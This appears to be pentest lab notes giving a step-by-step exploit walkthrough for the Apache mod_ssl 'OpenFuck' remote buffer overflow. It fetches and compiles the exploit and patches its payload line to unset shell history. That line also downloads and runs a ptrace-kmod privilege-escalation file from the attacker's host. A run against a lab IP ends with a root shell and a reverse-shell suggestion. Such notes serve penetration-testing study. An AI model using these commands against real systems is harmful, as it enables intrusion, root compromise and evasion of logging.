
# Openfck mod_ssl < 2.8

[Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow - Unix remote Exploit](https://www.exploit-db.com/exploits/21671)

[Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1) - Unix remote Exploit](https://www.exploit-db.com/exploits/764)

[Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2) - Unix remote Exploit](https://www.exploit-db.com/exploits/47080)

## Exploit Code

```
searchsploit -m 47080
```

## Get Supporting Exploit and Host it with HTTP
```
wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
```

## Mod Source Code

line 341, COMMAND2
```
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://$KALI/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm  trace-kmod.c; ./exploit; \n"
```

## Compile
```
gcc 47080.c -o of -lcrypto
```

## Exploit

example
```
./of 0x73 10.11.1.22 443
```

## Shell

*** there is no prompt **
```
whoami
root
```

Use a bash one-liner to catch a reverse shell and then upgrade PTY.
